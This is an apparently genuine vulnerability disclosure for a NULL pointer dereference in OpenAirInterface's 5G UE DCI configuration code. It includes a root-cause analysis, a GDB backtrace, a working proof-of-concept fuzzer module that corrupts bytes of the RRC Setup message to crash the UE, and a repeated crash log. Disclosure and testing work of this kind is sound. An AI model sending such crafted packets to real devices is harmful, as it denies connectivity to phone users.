**Vulnerability Source Code**
https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/0afa3f3193f77ce718148ca48cbf18b321d1cf23/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c#L139

```
rel15->coreset.duration = coreset->duration;
```

### Root Cause Analysis:
The segmentation fault is likely caused by a `NULL` pointer dereference. In this context, it appears that the `coreset` pointer, which is intended to hold control resource set information, may not have been properly initialized before being accessed. This function assumes `coreset` contains a valid memory address with a defined `duration` field, but if `coreset` is `NULL`, attempting to access `duration` will trigger a segmentation fault. This type of fault typically results from inadequate checks or missing error handling when populating `coreset`.

This is the root from the initialization of the coreset.

https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/0afa3f3193f77ce718148ca48cbf18b321d1cf23/openair2/LAYER2/NR_MAC_UE/mac_defs.h#L405

```
NR_ControlResourceSet_t         *coreset[MAX_NUM_BWP_UE][FAPI_NR_MAX_CORESET_PER_BWP];
```

The FAPI_NR_MAX_CORESET_PER_BWP is defined to be 3 here in the https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/0afa3f3193f77ce718148ca48cbf18b321d1cf23/nfapi/open-nFAPI/nfapi/public_inc/fapi_nr_ue_constants.h#L12

```
#define FAPI_NR_MAX_CORESET_PER_BWP                3
```

In the 3GPP specification TS 38.331, this ControlResourceSetId from the ASN.1 encoding rule ranges from 0 to 11. That means it is legitimate to construct or receive a packet with the ControlResourceSetId range from 0 to 11, while in this UE implementation, it is defined to be a maximum of 3.

![From the 3GPP specifications TS 38.331](https://github.com/qiqingh/OAI_Code_Analysis/blob/main/mac_sch_22_ControlResourceSet_reencoded_1/3GPP1.png)

![From the 3GPP specifications TS 38.331](https://github.com/qiqingh/OAI_Code_Analysis/blob/main/mac_sch_22_ControlResourceSet_reencoded_1/3GPP2.png)



### Vulnerability and Exploit Potential:
This issue can lead to potential security vulnerabilities under the following conditions:
1. **Input Validation and Pointer Initialization:** The function does not adequately validate the `coreset` pointer or the integrity of the `rel15` and `mac` structures before accessing their contents. If an attacker can manipulate input values or the control resource set ID (`coreset_id`), they could potentially induce invalid memory accesses.
2. **Impact on DCI Configuration:** Since DCI (Downlink Control Information) is critical in scheduling and configuring the UE's reception settings, improper handling here could allow an attacker to disrupt UE functionality by sending malformed or malicious packets. This can result in crashes, denial of service, or potentially even arbitrary code execution, depending on the memory layout and the extent of control over the function’s input parameters.

**Vulnerability Description:**

During the 5G NR UE connection setup process, a segmentation fault occurs in the OpenAirInterface (OAI) `config_dci_pdu` function when the `coreset` pointer is null or improperly initialized. This function does not perform sufficient checks on the `coreset` structure before accessing its `duration` field, leading to potential crashes (SIGSEGV) if malformed packets are processed during the RRC (Radio Resource Control) setup phase.

**Exploitability:**

By sending a crafted DCI configuration packet from the gNB that references an invalid control resource set, an attacker could trigger a segmentation fault on the UE. This crash causes a denial of service, disrupting the connection setup. In environments where the memory layout is known, and if further pointer manipulations are feasible, there may also be potential for arbitrary code execution.

**Impact:**

The vulnerability results in a denial-of-service condition on the UE. This can impact network stability and user experience.

**GDB Debug Information**

```console
Thread 13 "UEthread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ad0a1a00700 (LWP 48766)]
config_dci_pdu (mac=0x5bfae0141490, rel15=0x7ad0a178e2c8, dl_config=<optimized out>, rnti_type=1, ss_id=-1585913160) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c:139
139	  rel15->coreset.duration = coreset->duration;
(gdb) bt
#0  config_dci_pdu (mac=0x5bfae0141490, rel15=0x7ad0a178e2c8, dl_config=<optimized out>, rnti_type=1, ss_id=-1585913160) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c:139
#1  0x00005bfad674ad3b in ue_dci_configuration (mac=<optimized out>, dl_config=0x7ad0a178e2b8, frame=<optimized out>, slot=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c:397
#2  0x00005bfad6718e9a in nr_ue_dcireq (dcireq=0x7ad0a178e2a0) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c:1289
#3  0x00005bfad6746dd6 in nr_ue_scheduler (dl_info=0x7ad0a19fd170, ul_info=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_scheduler.c:1095
#4  0x00005bfad6716787 in nr_ue_dl_indication (dl_info=0x7ad0a19fd170, ul_time_alignment=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c:1159
#5  0x00005bfad65ff10e in UE_processing (rxtxD=0x7ad0a19ff8b0) at /home/user/wdissector/3rd-party/oai_5g_sa/executables/nr-ue.c:614
#6  0x00005bfad6600441 in UE_thread (arg=0x7ad0b4461010) at /home/user/wdissector/3rd-party/oai_5g_sa/executables/nr-ue.c:911
#7  0x00007ad0b3da66db in start_thread (arg=0x7ad0a1a00700) at pthread_create.c:463
#8  0x00007ad0b22fc61f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95

```

**Malformed Packet Send From the Base Station**
![Malformed Packet](https://github.com/qiqingh/OAI_Code_Analysis/blob/main/mac_sch_22_ControlResourceSet_reencoded_1/22_1_pcap.png)

**PoC Code**

The following PoC code generates a falsified packet sent from the Base Station (sender) to the User Equipment (receiver). Due to a vulnerability in the User Equipment, this packet causes the device to crash, resulting in a Denial of Service (DoS).

To compile and run this PoC code, you'll need the environment described here: https://github.com/asset-group/5ghoul-5g-nr-attacks?tab=readme-ov-file#4--create-your-own-5g-exploits-test-cases

```cpp
#include <ModulesInclude.hpp>

// Filters
wd_filter_t f1;

// Vars

const char *module_name()
{
    return "Mediatek";
}

// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;

    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);

    return 0;
}

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[129 - 48] = 0x11;
        pkt_buf[130 - 48] = 0x7f;
        pkt_buf[152 - 48] = 0x17;
        return 1;
    }

    return 0;
}

```

**Crash Event Log:**

```console
[2024-10-10 22:18:15.945949] [Open5GS] Subscribers registered to core network: 14
[2024-10-10 22:18:16.333291] [!] Simulation Enabled, disabling ModemManager and HubCtrl. Remember to enabled them later!
[2024-10-10 22:18:17.330948] Starting OAI UE Simulator (RFSIM)
[2024-10-10 22:18:17.351282] [!] UE process started
[2024-10-10 22:18:17.361491] [GlobalTimeout] Not enabled in config. file
[2024-10-10 22:18:17.361544] [AnomalyReport] Added Logging Sink: PacketLogger
[2024-10-10 22:18:17.361550] [AnomalyReport] Added Logging Sink: SvcReportSender
[2024-10-10 22:18:17.361554] [USBHubControl] Disabled in config. file
[2024-10-10 22:18:17.361558] [ModemManager] ModemManager not started!
[2024-10-10 22:18:17.361565] [ReportSender] Credentials file not found: modules/reportsender/credentials.json
[2024-10-10 22:18:17.361570] [ReportSender] Ready
[2024-10-10 22:18:17.361574] [Optimizer] Optimization disabled. Using default population:
[2024-10-10 22:18:17.361578] --------------------------------------------------------
[2024-10-10 22:18:17.361582] [Optimizer] Iter=1  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:17.361585] [Optimizer] Fitness=1e+06  Adj. Fitness=-1e+06
[2024-10-10 22:18:17.361589] --------------------------------------------------------
[2024-10-10 22:18:17.361592] [Optimizer] Initialized with X Size=293, Population Size=5
[2024-10-10 22:18:17.361596] [Main] Fuzzing not enabled! Running only target reconnection
[2024-10-10 22:18:17.361602] [PacketHandler] Added "proto:nas-5gs", Dir:0, Realtime:0, TID:911073
[2024-10-10 22:18:17.361606] [PacketHandler] Added "proto:nas-5gs", Dir:1, Realtime:0, TID:911074
[2024-10-10 22:18:17.361610] [PacketHandler] Added "proto:pdcp-nr-framed", Dir:0, Realtime:1, TID:911075
[2024-10-10 22:18:17.361614] [PacketHandler] Added "proto:pdcp-nr-framed", Dir:1, Realtime:1, TID:911076
[2024-10-10 22:18:17.384376] [PacketHandler] Added "proto:mac-nr-framed", Dir:0, Realtime:1, TID:911077
[2024-10-10 22:18:17.384443] [PacketHandler] Added "proto:mac-nr-framed", Dir:0, Realtime:1, TID:911078
[2024-10-10 22:18:17.384448] [PacketHandler] Added "proto:mac-nr-framed", Dir:1, Realtime:0, TID:911079
[2024-10-10 22:18:18.062538] [Main] eNB/gNB started!
[2024-10-10 22:18:18.062598] [!] Waiting UE task to start...
[2024-10-10 22:18:20.611536] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:20.611627] --------------------------------------------------------
[2024-10-10 22:18:20.611684] [Optimizer] Iter=1  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:20.611690] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 22:18:20.611695] --------------------------------------------------------
[2024-10-10 22:18:20.611700] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:20.712470] [!] UE process stopped
[2024-10-10 22:18:20.712518] [!] UE process crashed
[2024-10-10 22:18:20.712526] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:20.712532] [PacketLogger] Packet Number:8, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:20.722612] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:20.732983] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:20.753204] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:20.813629] [!] UE process started
[2024-10-10 22:18:20.892345] [AlertSender:Gmail] Creating token.json
[2024-10-10 22:18:21.607285] [UE] Restarting connection...
[2024-10-10 22:18:21.607346] [!] UE process stopped
[2024-10-10 22:18:21.768740] [!] UE process started
[2024-10-10 22:18:24.992167] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:25.002318] --------------------------------------------------------
[2024-10-10 22:18:25.002345] [Optimizer] Iter=2  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:25.002350] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 22:18:25.002354] --------------------------------------------------------
[2024-10-10 22:18:25.002358] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:25.092908] [!] UE process stopped
[2024-10-10 22:18:25.093353] [!] UE process crashed
[2024-10-10 22:18:25.093364] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:25.093370] [PacketLogger] Packet Number:22, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:25.103466] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:25.113556] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:25.133711] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:25.194470] [!] UE process started
[2024-10-10 22:18:25.274259] [AlertSender:Gmail] Creating token.json
[2024-10-10 22:18:25.999349] [UE] Restarting connection...
[2024-10-10 22:18:25.999411] [!] UE process stopped
[2024-10-10 22:18:26.150483] [!] UE process started
[2024-10-10 22:18:29.487969] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:29.489236] --------------------------------------------------------
[2024-10-10 22:18:29.489283] [Optimizer] Iter=3  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:29.489345] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 22:18:29.489364] --------------------------------------------------------
[2024-10-10 22:18:29.499441] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:29.600869] [!] UE process stopped
[2024-10-10 22:18:29.601019] [!] UE process crashed
[2024-10-10 22:18:29.601042] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:29.601057] [PacketLogger] Packet Number:36, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:29.611132] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:29.621270] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:29.641449] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:29.701971] [!] UE process started
[2024-10-10 22:18:29.799810] [AlertSender:Gmail] Creating token.json
[2024-10-10 22:18:30.484724] [UE] Restarting connection...
[2024-10-10 22:18:30.484778] [!] UE process stopped
[2024-10-10 22:18:30.652680] [!] UE process started
[2024-10-10 22:18:33.894451] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:33.897254] --------------------------------------------------------
[2024-10-10 22:18:33.897278] [Optimizer] Iter=4  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:33.897291] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 22:18:33.897304] --------------------------------------------------------
[2024-10-10 22:18:33.897318] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:33.991326] [!] UE process stopped
[2024-10-10 22:18:33.991514] [!] UE process crashed
[2024-10-10 22:18:33.991525] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:33.991532] [PacketLogger] Packet Number:50, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:34.001623] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:34.011741] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:34.031883] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:34.092342] [!] UE process started
[2024-10-10 22:18:34.171336] [AlertSender:Gmail] Creating token.json
[2024-10-10 22:18:34.889162] [UE] Restarting connection...
[2024-10-10 22:18:34.889218] [!] UE process stopped
[2024-10-10 22:18:35.055954] [!] UE process started
[2024-10-10 22:18:38.307352] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:38.310170] --------------------------------------------------------
[2024-10-10 22:18:38.310193] [Optimizer] Iter=5  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:38.310198] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 22:18:38.310203] --------------------------------------------------------
[2024-10-10 22:18:38.310207] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:38.400752] [!] UE process stopped
[2024-10-10 22:18:38.405477] [!] UE process crashed
[2024-10-10 22:18:38.405485] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:38.405493] [PacketLogger] Packet Number:64, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:38.415557] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:38.425650] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:38.445774] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:38.506219] [!] UE process started
[2024-10-10 22:18:38.585468] [AlertSender:Gmail] Creating token.json
[2024-10-10 22:18:39.310715] [UE] Restarting connection...
[2024-10-10 22:18:39.310775] [!] UE process stopped
[2024-10-10 22:18:39.471962] [!] UE process started
[2024-10-10 22:18:42.744320] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:42.747071] --------------------------------------------------------
[2024-10-10 22:18:42.747089] [Optimizer] Iter=6  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:42.747095] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 22:18:42.747100] --------------------------------------------------------
[2024-10-10 22:18:42.757192] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:42.850873] [!] UE process stopped
[2024-10-10 22:18:42.851054] [!] UE process crashed
[2024-10-10 22:18:42.851064] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:42.851070] [PacketLogger] Packet Number:78, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:42.861154] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:42.871259] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:42.891474] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:42.951891] [!] UE process started
[2024-10-10 22:18:43.023545] [AlertSender:Gmail] Creating token.json
[2024-10-10 22:18:43.748453] [UE] Restarting connection...
[2024-10-10 22:18:43.748505] [!] UE process stopped
[2024-10-10 22:18:43.909642] [!] UE process started
[2024-10-10 22:18:47.164695] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:47.167491] --------------------------------------------------------
[2024-10-10 22:18:47.167529] [Optimizer] Iter=7  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 22:18:47.167541] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 22:18:47.167555] --------------------------------------------------------
[2024-10-10 22:18:47.177644] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:47.268324] [!] UE process stopped
[2024-10-10 22:18:47.272181] [!] UE process crashed
[2024-10-10 22:18:47.272204] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:47.272223] [PacketLogger] Packet Number:92, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 22:18:47.282350] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:47.292510] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:47.312672] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 22:18:47.373133] [!] UE process started
[2024-10-10 22:18:47.392391] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:47.452856] [AlertSender:Gmail] Creating token.json
[2024-10-10 22:18:48.391473] [UE] Restarting connection...
[2024-10-10 22:18:48.391544] [!] UE process stopped
[2024-10-10 22:18:48.542489] [!] UE process started
[2024-10-10 22:18:48.559269] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:49.556191] [UE] Restarting connection...
[2024-10-10 22:18:49.556251] [!] UE process stopped
[2024-10-10 22:18:49.717547] [!] UE process started
[2024-10-10 22:18:49.727781] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:49.727842] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 22:18:50.724509] [UE] Restarting connection...
[2024-10-10 22:18:50.724587] [!] UE process stopped
[2024-10-10 22:18:50.893770] [!] UE process started

```
